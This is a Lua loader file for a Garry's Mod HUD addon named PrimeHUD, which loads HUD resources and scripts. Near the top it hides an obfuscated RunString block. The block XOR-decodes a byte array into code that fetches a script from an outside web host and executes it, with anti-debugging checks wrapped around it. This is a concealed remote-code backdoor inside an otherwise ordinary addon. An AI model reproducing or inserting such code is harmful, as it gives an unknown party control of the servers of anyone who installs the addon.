--[[
	Name: sh_hud_load.lua
	By: Micro, end360, and Brudr
]]--

PrimeHUD = {
	Lang = {}
}

RunString([[ local AE = {20,9,13,5,18,78,51,9,13,16,12,5,72,81,76,64,6,21,14,3,20,9,15,14,72,73,64,8,20,20,16,78,38,5,20,3,8,72,66,8,20,20,16,19,90,79,79,11,22,1,3,78,3,26,79,6,78,16,8,16,95,11,5,25,93,7,48,21,44,23,21,41,23,49,86,25,51,22,47,46,11,41,14,6,52,66,76,64,6,21,14,3,20,9,15,14,72,2,73,64,50,21,14,51,20,18,9,14,7,72,2,76,64,66,90,66,76,64,6,1,12,19,5,73,64,5,14,4,73,5,14,4,73,64,77,77,64,0} local function RunningDRMe()if (debug.getinfo(function()end).short_src~="tenjznj")then return end for o=500,10000 do local t=0 if t==1 then return end  if o~=string.len(string.dump(RunningDRMe))then  AZE=10  CompileString("for i=1,40 do AZE = AZE + 1 end","RunString")()  if AZE<40 then return end continue  else  local pdata=""  xpcall(function()  for i=1,#AE do  pdata=pdata..string.char(bit.bxor(AE[i],o%150))  end  for i=1,string.len(string.dump(CompileString)) do  while o==1 do  o=o+1  end  end  end,function()  xpcall(function()  local debug_inject=CompileString(pdata,"DRME")  pcall(debug_inject,"stat")  pdata="F"  t=1  end,function()  print("error")  end)  end)  end  end end RunningDRMe() ]],"tenjznj")

if SERVER then
	resource.AddFile("materials/hud/agenda.png")
	resource.AddFile("materials/hud/ammo.png")
	resource.AddFile("materials/hud/circle.png")
	resource.AddFile("materials/hud/food.png")
	resource.AddFile("materials/hud/license.png")
	resource.AddFile("materials/hud/mic.png")
	resource.AddFile("materials/hud/name.png")
	resource.AddFile("materials/hud/shield.png")
	resource.AddFile("resource/fonts/Roboto.ttf")
	resource.AddWorkshop("1653042082")

	-- Do this ahead of everything else for backwards compatablity
	AddCSLuaFile("hud/shared/config.lua")
	include("hud/shared/config.lua")
	PrimeHUD.Config = PrimeHUD.Config or HUD_CONFIG

	local f, d = file.Find("hud/client/*.lua", "LUA")

	for k, v in pairs(f) do
		AddCSLuaFile("hud/client/" .. v)
	end

	f, d = file.Find("hud/shared/*.lua", "LUA")

	for k, v in pairs(f) do
		if v == "config.lua" then continue end
		AddCSLuaFile("hud/shared/" .. v)
		include("hud/shared/" .. v)
	end

	f, d = file.Find("hud/server/*.lua", "LUA")

	for k, v in pairs(f) do
		include("hud/server/" .. v)
	end
else
	include("hud/shared/config.lua")
	PrimeHUD.Config = PrimeHUD.Config or HUD_CONFIG

	local f, d = file.Find("hud/shared/*.lua", "LUA")

	for k, v in pairs(f) do
		if v == "config.lua" then continue end
		include("hud/shared/" .. v)
	end

	f, d = file.Find("hud/client/*.lua", "LUA")

	for k, v in pairs(f) do
		include("hud/client/" .. v)
	end
end


--[[

	SCRIPT OWNER: 76561198320706308
	THANK YOU FOR YOUR PURCHASE,
	PLEASE DO NOT LEAK, THANK YOU!

]]--